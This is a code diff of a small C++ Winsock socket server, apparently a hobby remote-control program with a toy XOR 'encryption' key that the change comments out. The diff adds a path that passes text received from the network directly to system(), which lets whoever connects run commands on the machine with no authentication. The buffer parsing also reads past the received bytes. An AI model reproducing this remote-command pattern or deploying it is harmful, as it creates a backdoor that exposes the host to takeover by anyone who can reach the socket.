@@ -26,7 +26,7 @@ public:
 	void accept_connections();
 	void endclient();
 	int send_msg();
-	int receive();
+	int receive(int flag);
 };
 
 Socks::Socks() {
@@ -138,38 +138,43 @@ int Socks::send_msg() {
 		WSACleanup();
 		return 7;
 	}
+	else {
+		receive(1);
+	}
 
 	return 0;
 }
 
 //receive message from client
-int Socks::receive() {
+int Socks::receive(int flag) {
 	int result = 0;
-	char recvbuf[512];
+	char recvbuf[4000];
 	std::string msg = "";
 	std::string peaky = "enCRAPtion";
 	int peaky_len = peaky.length();
 
-	result = recv(ClientSocket, recvbuf, 512, 0);
+	result = recv(ClientSocket, recvbuf, 4000, 0);
 	
 
 	if (result > 0) {
 		//parse actual data from message
-		for (int i = 0; i < 512; i++) {
+		for (int i = 0; i < 4000; i++) {
 			if (recvbuf[i] > 0)
 				msg = msg + recvbuf[i];
 		}
 
 		int msg_len = msg.length();
 		//unencrypt
-		for (int i = 0, x = 0; i < msg_len; i++, x++) {
+		/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
 			if (x >= peaky_len) {
 				x = 0;
 			}
-			//msg = msg + recvbuf[i];
-			msg[i] = msg[i] ^ peaky[x];
-		}
+			//msg[i] = msg[i] ^ peaky[x];
+		}*/
 		printf("Unencrypted message: %s\n", msg.c_str());
+		if (flag == 0) {
+			system(msg.c_str());
+		}
 	}
 	else if (result == 0)
 		printf("Connection closed\n");
@@ -193,9 +198,8 @@ int main()
 	serv_sock.accept_connections();
 	serv_sock.send_msg();
 	//
-	serv_sock.receive();
+	//serv_sock.receive(0);
 	int temp = 0;
 	std::cin >> temp;
     return 0;
 }
-
